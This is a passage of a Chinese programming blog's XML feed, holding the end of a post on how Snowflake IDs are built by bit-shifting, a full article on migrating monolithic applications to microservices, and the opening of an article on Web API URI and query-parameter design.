2^27&#125;  :          134217728</span><br><span class="line">    2^26&#125;  :           67108864</span><br><span class="line">    2^21&#125;  :            2097152</span><br><span class="line">    2^17&#125;  :             131072</span><br><span class="line">    2^16&#125;  :              65536</span><br><span class="line">    2^15&#125;  :              32768</span><br><span class="line">+   2^12&#125;  :               4096</span><br><span class="line">---------------------------------------- </span><br><span class="line">             910499571847892992</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>计算截图：</p>
<figure class="image-box">
                <img src="582624281-59c27ffe44bc5_articlex.png" alt title class>
                <p></p>
            </figure>

<p>跟测试程序打印出来的结果一样，手工验证完毕！</p>
<h1 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 1  |                    41                        |  5  |   5  |     12      </span><br><span class="line">    </span><br><span class="line">   0|0001100 10100010 10111110 10001001 01011100 00|     |      |              //la</span><br><span class="line">   0|                                              |10001|      |              //lb</span><br><span class="line">   0|                                              |     |1 1001|              //lc</span><br><span class="line">or 0|                                              |     |      |‭0000 00000000‬ //sequence</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">   0|0001100 10100010 10111110 10001001 01011100 00|10001|1 1001|‭0000 00000000‬ //结果：910499571847892992</span><br></pre></td></tr></table></figure>

<p>上面的 64 位我按 1、41、5、5、12 的位数截开了，方便观察。</p>
<ul>
<li><strong>纵向</strong> 观察发现：<ul>
<li>在 41 位那一段，除了 la 一行有值，其它行（lb、lc、sequence）都是 0，（我爸其它）</li>
<li>在左起第一个 5 位那一段，除了 lb 一行有值，其它行都是 0</li>
<li>在左起第二个 5 位那一段，除了 lc 一行有值，其它行都是 0</li>
<li>按照这规律，如果 sequence 是 0 以外的其它值，12 位那段也会有值的，其它行都是 0</li>
</ul>
</li>
<li><strong>横向</strong> 观察发现：<ul>
<li>在 la 行，由于左移了 5+5+12 位，5、5、12 这三段都补 0 了，所以 la 行除了 41 那段外，其它肯定都是 0</li>
<li>同理，lb、lc、sequnece 行也以此类推</li>
<li>正因为左移的操作，使四个不同的值移到了 SnowFlake 理论上相应的位置，然后四行做位或运算（只要有 1 结果就是 1），就把 4 段的二进制数合并成一个二进制数。</li>
</ul>
</li>
</ul>
<p><strong>结论</strong>：<br>所以，在这段代码中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((timestamp - <span class="number">1288834974657</span>) &lt;&lt; <span class="number">22</span>) |</span><br><span class="line">        (datacenterId &lt;&lt; <span class="number">17</span>) |</span><br><span class="line">        (workerId &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">        sequence;</span><br></pre></td></tr></table></figure>

<p>左移运算是为了将数值移动到对应的段（41、5、5、12 那段因为本来就在最右，因此不用左移）。<br>然后对每个左移后的值（la、lb、lc、sequence）做位或运算，是为了把各个短的数据合并起来，合并成一个二进制数。<br>最后转换成十进制，就是最终生成的 id  </p>
<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>在理解了这个算法之后，其实还有一些扩展的事情可以做：</p>
<ol>
<li>根据自己业务修改每个位段存储的信息。算法是通用的，可以根据自己需求适当调整每段的大小以及存储的信息。</li>
<li>解密 id，由于 id 的每段都保存了特定的信息，所以拿到一个 id，应该可以尝试反推出原始的每个段的信息。反推出的信息可以帮助我们分析。比如作为订单，可以知道该订单的生成日期，负责处理的数据中心等等。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何把单体式应用拆解成微服务？]]></title>
      <url>/2019/12/28/HowToChangeSingleAppIntoMicroServices/</url>
      <content type="html"><![CDATA[<blockquote>
<p>上：<a href="https://www.cnblogs.com/itlaobingge/p/12095774.html" target="_blank" rel="noopener">https://www.cnblogs.com/itlaobingge/p/12095774.html</a><br>下：<a href="https://www.cnblogs.com/itlaobingge/p/12100154.html" target="_blank" rel="noopener">https://www.cnblogs.com/itlaobingge/p/12100154.html</a></p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;微服务是当下最流行的应用架构技术了，它跟容器服务、DevOps 合称云时代的三剑客，可以帮我们化解业务发展过快导致的产品迭代压力，让我们可以自由选择最适合团队的技术栈，让系统能够承载互联网海量用户的访问，让我们可以更加轻松地运维大型的互联网系统。近些年在厂商、社区和用户等各方努力推动下，微服务相关的理论和产品都日趋成熟，不同语言的微服务开发及治理套件（例如：Spring Cloud / Dubbo 等）让我们从零开始搭建微服务变得非常简单快捷，那我们是否就此可以全面进入微服务时代呢？<br>&emsp;&emsp;微服务的演进成熟需要时间，我们熟悉掌握这套新技术也需要时间，除此之外机房里面还跑着大量的单体式应用，它们需要继续维护和升级，任何时候我们都不可能抛开历史轻松上阵。这些单体式应用还担负着公司的核心业务，全部推倒重来、休克式重构是不可取的，投入大周期长，风险完全不可控。我们必须学会边行车边换胎的技能，在不影响现网业务的前提下推动微服务改造，让老系统焕发新的生命力，继续支持业务下一个十年的发展。本文将跟你一起探讨微服务改造相关的经验方法，让你更加从容地拥抱微服务！</p>
<h1 id="边行车边换胎三步走演进策略"><a href="#边行车边换胎三步走演进策略" class="headerlink" title="边行车边换胎三步走演进策略"></a>边行车边换胎三步走演进策略</h1><p>&emsp;&emsp;如何从单体式应用演进至微服务呢？这些单体式应用都存在很长时间了，经过这么长时间的修修补补，体量规模都比较大，尤其是经过几波人交接维护，业务逻辑也变得异常复杂。同时，它们都在线对外提供服务，全部推倒重建的可能性微乎其微，休克式重构投入大周期长，风险也不好控制，还会影响业务对外服务的连续性。从现实情况出发，最可行的架构优化方案就是渐进式的微服务改造，按照业界的最佳实践和个人经验，该演进策略主要包括三个关键步骤：</p>
<ul>
<li>将所有新特性都构建成微服务，遏制单体式应用的生长；</li>
<li>在微服务和单体式应用之间构建反腐层，防止老系统腐化新系统；</li>
<li>按照特定的优先顺序由外而内逐步瓦解单体式应用。</li>
</ul>
<h2 id="新建微服务"><a href="#新建微服务" class="headerlink" title="新建微服务"></a>新建微服务</h2><p>&emsp;&emsp;通常单体式应用所采用的技术相对较老旧，维护这些系统的同事缺少机会学习实践当前主流的技术，久而久之就跟不上主流技术的发展，在晋升、加薪和跳槽时都缺乏竞争力，这会影响到个人的价值。随着系统规模越来越庞大，更新升级和运营维护的难度越来越大，每次发版都要加班加点和心惊胆战，逐渐满足不了业务快速发展的需要。在单体式架构之下，团队无法利用不同技术栈的优势解决不同场景下的问题，即使解决了问题也是事倍功半。<br>&emsp;&emsp;当意识到有必要将单体式应用改造成微服务时，我们通常会认为改造就是将单体式应用一块一块地敲下来改成微服务，这种想法是最直接的，但难度和风险也是最大的。改造初始我们对微服务相关技术也比较生疏，再加上拆解单体式应用本身的难度，双重困难叠加往往会导致改造失败或延期。<br>&emsp;&emsp;最靠谱的策略是先停止往单体式应用里面添加新的特性，所有新特性都构建成微服务，从而遏制单体式应用继续生长。新特性通常不会太复杂，新建微服务也要比从单体式应用上剥离微服务容易一些，借助这个过程让团队逐渐熟悉掌握微服务技术栈，从小规模练兵再到全面铺开。常见的微服务架构如下图所示，主要包含以下几大必备组件：</p>
<figure class="image-box">
                <img src="microservice-refactoring-01.jpg" alt title class>
                <p></p>
            </figure>

<ul>
<li><strong>注册中心</strong>，提供微服务的注册、发现和状态监测等功能；</li>
<li><strong>配置中心</strong>，解耦代码与配置，通过统一的远程配置中心管理每个微服务的配置数据，支持动态修改和立即生效等；</li>
<li><strong>治理中心</strong>，依赖注册中心和配置中心，提供服务降级、服务熔断、流量控制、灰度管理等功能；</li>
<li><strong>API 网关</strong>，将每个微服务汇聚一起对外提供服务，网关本身会提供安全鉴权、服务路由、流量控制、计量计费等横切面功能。</li>
</ul>
<h2 id="构建反腐层"><a href="#构建反腐层" class="headerlink" title="构建反腐层"></a>构建反腐层</h2><p>&emsp;&emsp;新特性全部构建成了微服务，但老特性还依旧在单体式应用当中，许多业务还需要新旧系统彼此协作才能完成，那么微服务和单体式应用之间还存在彼此交互。但新旧系统对外服务时所采用的协议可能不同，例如：采用 Spring Cloud 框架开发的微服务主要以 RESTful HTTP API 对外服务，采用 Dubbo 框架开发的微服务以 Dubbo 协议对外服务，而单体式应用可能以 Web Service、EJB T3、不规范 HTTP API 等形式对外服务。除了协议不同之外，新旧系统对领域模型的定义也可能不同，包括名称和属性等，如何调和微服务和单体式应用的不同呢？<br>&emsp;&emsp;在微服务和单体式应用之间构建一道反腐层，这或许是最切实可行的办法。通过反腐层完成新旧系统的对接集成，又可以避免旧系统领域模型对新系统的干扰，让彼此保持松耦合状态，阻止旧系统的腐烂蔓延至新系统。反腐层还可以对单体式应用进行服务化封装，让其像微服务一样以 RESTful HTTP API 的方式对外服务。反腐层支持双向通讯，重点解决新旧系统对接集成、协议适配和模型转换等问题，按照此功能定位我们可以将反腐层划分成三个模块：</p>
<ul>
<li><strong>外观（Facade）</strong>，经典设计模式，作为旧系统所有服务接口的门面，简化新旧系统对接的复杂度；</li>
<li><strong>适配器（Adapter）</strong>，经典设计模式，向新系统提供所需的服务实体，负责请求和应答的协议适配；</li>
<li><strong>转换器（Translator）</strong>，负责请求和应答中新旧系统领域模型的转换。</li>
</ul>
<p>&emsp;&emsp;由于单体式应用的架构较为简单，因此在设计之初它们很少考虑系统集成相关的设计，通常一个应用下的不同服务拥有各自的入口，外观（Facade）就是解决此问题的，统一单体式应用对外服务的格式，像微服务一样以 RESTful HTTP API 的方式对外服务，规范接口的协议类型、URL 命名和报文格式等。如果旧系统不属于我们维护，那反腐层就需要包含 Facade 模块，微服务通过它对接旧系统。如果旧系统也是由我们自己维护，那建议将 Facade 模块构建在单体式应用内部，微服务通过 Adapter 模块对接旧系统。</p>
<h2 id="围剿单体式应用"><a href="#围剿单体式应用" class="headerlink" title="围剿单体式应用"></a>围剿单体式应用</h2><p>&emsp;&emsp;在旧系统周边构建微服务，遏制旧系统的不断生长，然后再从旧系统逐步剥离出微服务，最后完成对单体式应用的绞杀。优良的微服务设计同样遵循高内聚、低耦合原则，将关联紧密的行为封装进一个微服务当中，从而可以减少需求变更所影响的范围。只要服务契约不发生改变，那对单个微服务的升级改造都不会影响到其他服务，因此可以发布更少的服务来快速地满足业务需求，并降低同时部署多个微服务时带来的风险。在从单体式应用剥离微服务之前，我们先看看功能模块之间的边界有哪些类型：</p>
<ul>
<li><strong>技术边界</strong>：将系统按照技术栈的不同划分，形成两个部件的边界。它们所采用的技术大相径庭，对开发人员的技能要求不同。业界将此种架构叫做洋葱架构，拥有许多水平分层，不利于改造成微服务。</li>
<li><strong>地域边界</strong>：按照组织分布的地域划分，相对较容易改造成微服务。</li>
<li><strong>业务边界</strong>：按照业务类型划分，最适合作为微服务的边界类型。</li>
</ul>
<p>&emsp;&emsp;领域驱动设计（DDD）理论提出了有界上下文（Bounded Context）概念，这是我们理清服务边界的有效工具，我们可以借助它从单体式应用上剥离微服务。因此，单体式应用的微服务化改造，亦或新建微服务，我们都离不开业务专家的支持，通过他们确定有界上下文的划分，从而设计出好的微服务。</p>
<h1 id="隔离网关接管新旧系统间交互"><a href="#隔离网关接管新旧系统间交互" class="headerlink" title="隔离网关接管新旧系统间交互"></a>隔离网关接管新旧系统间交互</h1><p>&emsp;&emsp;在前面章节中我们已经知道在微服务改造过程中需要构建反腐层，那在实际项目当中反腐层会以什么样的形态存在呢？通常我们会将反腐层设计成隔离网关，以单独的进程运行，在隔离网关内部实现 Facade、Adapter 和 Translator 等功能模块。隔离网关不需要从零开始建设，我们可以在 Nginx、Kong、Zuul 等开源中间件基础上扩展，它们都支持插件化或过滤器等扩展定制模式，我们很容易实现反腐层需要的功能。</p>
<figure class="image-box">
                <img src="microservice-refactoring-02.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;通过反腐层（隔离网关）微服务可以与单体式应用进行正常通信，同时彼此之间保持松耦合，单体式应用可以不用做伤筋动骨的改动，微服务可以采用最新的技术独立演进，但这种方案下这些遗留的单体式应用是无法享受到云原生带来的好处。有没有一种方案可以让这些遗留系统也享受到服务发现、流量控制、服务熔断、服务降级等新特性呢？<br>&emsp;&emsp;Service Mesh，下一代微服务架构，可以给我们带来更加完善的解决方案，它将原先通过微服务开发框架（例如：Spring Boot 等）侵入到应用内部的服务治理等功能模块封装进了 Sidecar，与应用结对部署，作为独立的进程存在，这样可以做到与应用松耦合，架构上更加灵活，可以支持微服务治理相关基础设施的独立升级部署，还可以支持多语言。如果在 Sidecar 基础上再扩展隔离网关的功能，那遗留的单体式应用也可以更加融入微服务架构了。</p>
<figure class="image-box">
                <img src="microservice-refactoring-03.jpg" alt title class>
                <p></p>
            </figure>

<h1 id="单体式应用拆解微服务的方法"><a href="#单体式应用拆解微服务的方法" class="headerlink" title="单体式应用拆解微服务的方法"></a>单体式应用拆解微服务的方法</h1><p>&emsp;&emsp;本章节我们将梳理从单体式应用剥离微服务的一些常见场景和方案。在谈具体案例之前，我们有必要先了解一下业界最佳实践的经验总结，它主要包含以下几个基本步骤：</p>
<ul>
<li><strong>识别出某个业务板块的上下文边界，这是拆解单体式应用的关键步骤。</strong>微服务是按照业务来划分和组织的，在动手拆解之前先要理清当前一个单体式应用提供了哪些业务功能，例如：用户管理、商品展示、订单管理、支付管理和物流管理等，按照垂直方向划分出来的功能板块都可以改造成微服务。具体操作时大部分编程语言都提供了命名空间（NameSpace）特性，我们在重构过程中可以借助它将同一个上下文相关的代码归集在一起，然后从整个工程中将其拆解出来形成微服务。</li>
<li><strong>理清业务功能模块之间的依赖，尽量减少依赖关系，从变化频繁、投入产出比高的模块开始剥离，这样可以逐步缓解日常开发的进度压力。</strong>经过依赖关系的梳理，冗余的依赖将会被消除，剩下的依赖将会从进程内部的函数调用改造成进程之间的 RESTful HTTP API 调用。 </li>
<li><strong>拆解数据，包括数据访问层和数据库表等。</strong>除了代码，数据也要被拆解，数据访问层要被打散到不同的命名空间当中，数据库表之间的外键依赖需要被清理消除等。</li>
</ul>
<p>&emsp;&emsp;从业务开始，再到代码，最后才是数据，这就是上述三个步骤的关键。业务是所有代码和数据的源头，面向对象设计（OOD）和领域驱动设计（DDD）是做好微服务设计的专业技能，而用好这两项技能的前提就是对业务有深刻的洞悉。</p>
<h1 id="拆解场景"><a href="#拆解场景" class="headerlink" title="拆解场景"></a>拆解场景</h1><h2 id="场景-1：数据库表外键引用关系"><a href="#场景-1：数据库表外键引用关系" class="headerlink" title="场景 1：数据库表外键引用关系"></a>场景 1：数据库表外键引用关系</h2><p>&emsp;&emsp;如果单体式应用中两个功能模块存在数据引用关系，那我们在拆解微服务时如何消除这种外键引用关系呢？首先，停⽌外键引⽤；然后，改成通过 RESTful HTTP API ⽅式获取原先外键关联的信息。如下图，改造前 Payment 数据库表中的记录通过外键引用 Order，代码层面通常会借助对象关系映射（ORM）框架建立数据对象的关联，改造后代码层面就不能通过 ORM 框架做关联了。在 Payment 数据库表的记录中会保存 Order 的主键值，除此之外还会保存 Order 的关键属性信息，这样可以避免频繁的跨进程调用，从而可以提高系统的整体效率表现。  </p>
<p>下图是改造前的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-04.jpg" alt title class>
                <p></p>
            </figure>

<p>下图是改造后的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-05.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="场景-2：共享静态数据关系"><a href="#场景-2：共享静态数据关系" class="headerlink" title="场景 2：共享静态数据关系"></a>场景 2：共享静态数据关系</h2><p>&emsp;&emsp;如果单体式应用中两个功能模块彼此共享静态数据，那我们在拆解微服务时如何消除这种共享关系呢？静态数据通常存储在数据库当中，例如：商品类目代号。如果这些静态数据需要更新，那我们就需要频繁地发布系统，这样会导致多个服务的中断。<br>&emsp;&emsp;为了避免这个问题，我们也可以将这些静态数据拷贝多份，分别⽤于每个服务，但维护多份数据拷⻉的一致性是个问题。另外，我们也可以将这些静态数据存⼊每个服务的配置文件，降低更新数据的难度。统一配置中心，微服务架构中的必选组件，我们可以通过它来管理这些静态数据，这样在维护更新上会带来极大的便利。</p>
<h2 id="场景-3：共享基础数据关系"><a href="#场景-3：共享基础数据关系" class="headerlink" title="场景 3：共享基础数据关系"></a>场景 3：共享基础数据关系</h2><p>&emsp;&emsp;如果单体式应用中两个功能模块共享某类基础数据，那我们在拆解微服务时如何消除这种共享关系呢？多个服务共享某类基础数据，例如：用户数据、物流公司数据等等，那我们要为这类数据提炼出专门的领域模型，将它封装成微服务，然后通过该服务来访问这些共享的基础数据。服务化带来的好处就是彼此之间仅仅依赖服务契约，双方具体采用什么技术和方案都是自由的。只要服务契约没有改变，那彼此的升级改造就不会影响。  </p>
<p>下图是改造前的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-06.jpg" alt title class>
                <p></p>
            </figure>


<p>下图是改造后的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-07.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="场景-4：共享数据库表格"><a href="#场景-4：共享数据库表格" class="headerlink" title="场景 4：共享数据库表格"></a>场景 4：共享数据库表格</h2><p>&emsp;&emsp;如果单体式应用中两个功能模块共享一张数据表格，那我们在拆解微服务时如何消除这种共享关系呢？多个服务各自引⽤的数据被合并存储在一张数据库表当中，代码层面借助 ORM 框架实现多态，这种情况我们需要将每个服务所关注的数据剥离出来，分别存到不同的表格当中。  </p>
<p>下图是改造前的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-08.jpg" alt title class>
                <p></p>
            </figure>

<p>下图是改造后的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-09.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="场景-5：共享数据库"><a href="#场景-5：共享数据库" class="headerlink" title="场景 5：共享数据库"></a>场景 5：共享数据库</h2><p>&emsp;&emsp;在拆解微服务过程中，我们该如何拆分数据库呢？最稳妥的方案就是分阶段重构数据库，数据是最宝贵的资源，我们不要贪图一步到位。  </p>
<p>下图是改造前的情况：</p>
<figure class="image-box">
                <img src="microservice-refactoring-10.jpg" alt title class>
                <p></p>
            </figure>

<p>第一步，按照业务上下文先将一个数据库拆解成两个数据库，但应用仍然是单体式应用，通过多数据源相关技术应用可以同时访问两个数据库，如下图所示：</p>
<figure class="image-box">
                <img src="microservice-refactoring-11.jpg" alt title class>
                <p></p>
            </figure>

<p>第二步，将单体式应用拆解成微服务，每个微服务都有各自独立的数据库，如下图所示：</p>
<figure class="image-box">
                <img src="microservice-refactoring-12.jpg" alt title class>
                <p></p>
            </figure>

<h1 id="旧模块微服务改造优先级原则"><a href="#旧模块微服务改造优先级原则" class="headerlink" title="旧模块微服务改造优先级原则"></a>旧模块微服务改造优先级原则</h1><p>&emsp;&emsp;从单体式应用中划分出有界的上下文，作为剥离微服务的候选，然后开始依次重构每个功能模块。那如何判断哪些模块应该优先被剥离成微服务呢？从模块剥离难度看，我们可以遵循先易后难的原则，逐步积累重构经验，这适用于在微服务构建方面经验不太丰富的团队；从需求变化频率看，优先剥离那些变更频繁的模块，整体收益会更大一些，这对于人力资源较为紧张的团队不失为一个好的判断准则；从资源消耗类型看，那些计算或内存密集的模块适合优先剥离，这样有利于弹性伸缩时提升资源利用效率，这对系统规模较大的场景效果最明显；从服务边界粒度看，粒度越粗越好剥离。具体按哪个规则来安排微服务的改造顺序，这就要根据每个团队的具体情况来具体分析了。<br>&emsp;&emsp;我们在支持不同系统实施微服务改造的过程中，上述优先级原则都被采用过，优先级存在的原因就是资源不够。微服务改造不是一蹴而就的事情，这个过程会持续很长时间，可能跨度几年，在不同阶段需要考虑的问题也就不同，最核心的原则就是按照适合自己的节奏有条不紊地开展工作，在确保线上业务稳定的前提下适当地追求速度。</p>
<h1 id="微服务改造是否结束判断标准"><a href="#微服务改造是否结束判断标准" class="headerlink" title="微服务改造是否结束判断标准"></a>微服务改造是否结束判断标准</h1><p>&emsp;&emsp;那什么时候才算完成微服务改造呢？判断标准就是旧系统中全部有界上下文都被剥离成微服务，此时反腐层就可以被废除了；或者遗留的单体式应用相对较稳定，不再发生变化，重构的投入产出比不再划算；或者遗留的单体式应用关联业务已经退出市场了，系统下线了。</p>
<h1 id="微服务架构新挑战与解决方案"><a href="#微服务架构新挑战与解决方案" class="headerlink" title="微服务架构新挑战与解决方案"></a>微服务架构新挑战与解决方案</h1><p>&emsp;&emsp;当单体式应用被拆解成多个微服务之后，原先在一个事务边界内的操作现在要跨多个事务边界了，我们如何保证事务的一致性呢？下面是一些分布式事务机制：</p>
<ul>
<li>再次尝试，最终一致：将每个操作步骤放⼊队列排队，后续再次尝试，确保最后执行成功，状态达成⼀致。</li>
<li>撤销全部操作：补偿事务机制，原事务操作失败之后，启动一个新的事务去撤销之前的操作。如果补偿事务也失败了，那系统需要提供手动或自动再次运⾏补偿事务的功能。</li>
<li>分布式事务：通过一个全局事务管理器来协调各个事务得以成功执行。对于短期事务，通常采用两阶段提交（Two-Phase Commit），第一阶段是投票阶段，分布式事务的参与者告诉事务管理器，判断本地事务是否可以顺利执行。如果事务管理器收集到所有投票结果都是 YES，那就开始提交事务执行。</li>
</ul>
<p>&emsp;&emsp;分布式事务机制本身不算太复杂，我们借鉴业界的一些开源产品自研了一套分布式事务框架，跟微服务框架结合起来，应用开发者只需要按照框架的约定实现特定的接口，通过一些注解就可以发起分布式事务，相关细节可以参考阿里的全局事务服务 GTS。  </p>
<p>&emsp;&emsp;当单体式应用被拆解成多个微服务之后，原先集中存储的数据也被分开存储了，报表生成将会遇到新的挑战。在单体式应⽤情况下，通常有一个用于生成报表的从库，从主库同步数据，仅⽤于查询等读操作，避免⽣成报表过程影响主库的读写效率。在微服务情况下，我们将要通过服务调用来获取数据，设计适合报表统计的批量接口，以及增加缓存用于提升数据获取效率。</p>
<ul>
<li>数据抽取：通过服务调⽤来获取报表所需数据，这会造成非常⼤的负载，以及专⻔为报表设计的 API。为了弥补上述不足，我们可以将数据抽取程序独立出来，专门从业务数据库中抽取数据到报表数据库。</li>
<li>事件驱动数据抽取：基于事件驱动的微服务架构，我们可以开发特定事件的订阅者，负责将数据同步到报表数据库，这样可以解耦底层数据库系统。</li>
</ul>
<p>&emsp;&emsp;微服务改造是一个长期过程，这个过程会遇到各式各样的问题，方法论可以帮助我们更好地解决这些问题，并且降低风险。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何设计出优美的 Web API？]]></title>
      <url>/2019/12/28/HowToDesignGoodWebApi/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/itlaobingge/p/12089657.html" target="_blank" rel="noopener">https://www.cnblogs.com/itlaobingge/p/12089657.html</a></p>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="1876334-20191224091939934-77559966.jpg" alt title class>
                <p></p>
            </figure>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;WEB API 的应用场景非常丰富，例如：将已有系统的功能或数据开放给合作伙伴或生态圈；对外发布可嵌入到其他网页的微件；构建前后端分离的 WEB 应用；开发跨不同终端的移动应用；集成公司内部不同系统等等。在上述场景里，你可能是 WEB API 的使用者，也可能是设计者，但你知道如何评判 WEB API 的优劣吗？</p>
<h1 id="评判标准"><a href="#评判标准" class="headerlink" title="评判标准"></a>评判标准</h1><p>我们可以从三个维度来评判一个 WEB API 的优劣：</p>
<ul>
<li>易于使用：WEB API 的用户是程序还是人？我觉得首先是人，然后是程序。为什么这么说呢？是否采用某个 WEB API 的决定是人做出的，一个好的 WEB API 必须符合人的审美，例如：简短易记、通俗易懂、便于输入等。从程序角度看，WEB API 应该遵循行业规范，在调用时不需要做特殊化处理，有利于复用已有的代码或工具。</li>
<li>便于更改：一个 WEB API 发布上线之后，免不了要根据真实用户的反馈或者业务发展的需要做更新修改，这些更新修改必须尽量不影响用户。要么提供多版本支持，要么给用户提供切实可行的更新策略等等。</li>
<li>健壮稳定：对外公开的 WEB API 存在被攻击的风险，以及无法准确预估的访问量等，一个好的 WEB API 必须要有防注入、防篡改、防重放等安全机制，还要在访问量急剧上涨时避免服务被击穿。</li>
</ul>
<p>&emsp;&emsp;做到了上述三个方面，我们才有底气将一个WEB API对外开放，接受公众的检验。好的 WEB API 不仅方便使用，还助于提升个人或企业的技术影响力，从而形成正向循环，带来越来越多的业务价值。为了设计出优美的 WEB API，我们需要了解与之相关的设计规范和事实标准，并且在设计开发过程中尽量遵循它们。</p>
<h1 id="设计规范"><a href="#设计规范" class="headerlink" title="设计规范"></a>设计规范</h1><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><ul>
<li><p>便于输入的 URI，简短不冗余。每个 WEB API 都是一个服务，那下面反例当中的 “service” 就是冗余的，而且 “api” 也重复出现了两次，这种冗余都不利于记忆和输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反例：http://api.example.com/service/api/users</span><br><span class="line">正例：http://api.example.com/users</span><br></pre></td></tr></table></figure>
</li>
<li><p>容易读懂的 URI，不要随意采用缩写，缩写必须要符合国际标准规范，不要凭空发明创造，例如：国家代码定义（ISO3166）。反例中出现了两处缩写 “sv”、“u”，在没有附加说明的情况下，用户压根不知道含义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反例：http://api.example.com/sv/u</span><br></pre></td></tr></table></figure>
</li>
<li><p>没有大小写混用的 URI。HTTP 协议（RFC7230）规定：除了模式（schema）和主机名以外，URI 的其他信息都要区分字母的大小写。下述两个反例大小写混用，不方便记忆。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反例：http://api.example.com/Users/12345</span><br><span class="line">反例：http://example.com/API/getUserName</span><br></pre></td></tr></table></figure>
</li>
<li><p>易于修改的 URI，命名存在可预见的规律。下述正例我们可以很容易猜测改变最后的 ID 就可以访问其他商品的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正例：http://api.example.com/v1/items/123456</span><br></pre></td></tr></table></figure>
</li>
<li><p>不会暴露服务端架构的 URI，URI 只需要体现功能、数据结构和含义，无需暴露服务端如何运作的信息。这些信息对用户来说没有意义，还存在潜在的风险，恶意用户或者黑客会利用这些信息来寻找漏洞，发起对服务的攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反例：http://api.example.com/cgi-bin/get_user.php?user=100</span><br></pre></td></tr></table></figure>
</li>
<li><p>规则统一的 URI，确保采用统一的规则和风格，方便用户记忆和使用。下述反例中第一个 URI 采用了查询参数，第二个 URI 采用了路径参数，这两者没有保持一致，容易造成混乱。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反例：获取好友信息，http://api.example.com/friends?id=100</span><br><span class="line">反例：发送消息，http://api.example.com/friend/100/messages</span><br><span class="line">正例：获取好友信息，http://api.example.com/friends/100</span><br><span class="line">正例：发送消息，http://api.example.com/friends/100/messages</span><br></pre></td></tr></table></figure>
</li>
<li><p>URI 最好由名词组成。URI 的全称是统一资源定位符（Uniform Resource Identifier），用于标识资源在互联网上的位置，类似于邮寄地址，而地址都是由名词组成的。在名词使用上也有一些需要注意的事项：其一，使用名词复数形式；其二，尽量采用多数 API 中使用的表示相同含义的单词；其三，通过尽可能少的单词来表示；其四，尽可能不用奇怪的缩略语等。</p>
</li>
<li><p>不使用空格及需要编码的字符，例如在 URI 中使用中文等。</p>
</li>
<li><p>使用连接符（-）来连接多个单词，推荐脊柱法：首先，URI 里的主机名（域名）允许使用连字符而禁止使用下划线，且不区分大小写。其次，点字符具有特殊含义，为了与主机名的规则保持一致。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">脊柱法：http://api.example.com/v1/users/12345/profile-image</span><br><span class="line">蛇形法：http://api.example.com/v1/users/12345/profile_image</span><br><span class="line">驼峰法：http://api.example.com/v1/users/12345/profileImage</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="查询参数"><a href="#查询参数" class="headerlink" title="查询参数"></a>查询参数</h2><ul>
<li><p>许多场景下需要通过 API 分批次获取数据，我们会经常纠结采用什么样的查询参数，业界有两种常用的参数设计（per-page 与 page、limit 与 offset），用于标识每次获取的数据量和起始位置。在分批次获取数据的过程中，数据集合中的记录可能发生增删改变，我们需要注意采用相对位置或绝对位置所带来的不同效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">风格1：http://api.example.com/friends?per-page=50&amp;page=3</span><br><span class="line">风格2：http://api.example.com/friends?limit=50&amp;offset=100</span><br></pre></td></tr></table></figure>
</li>
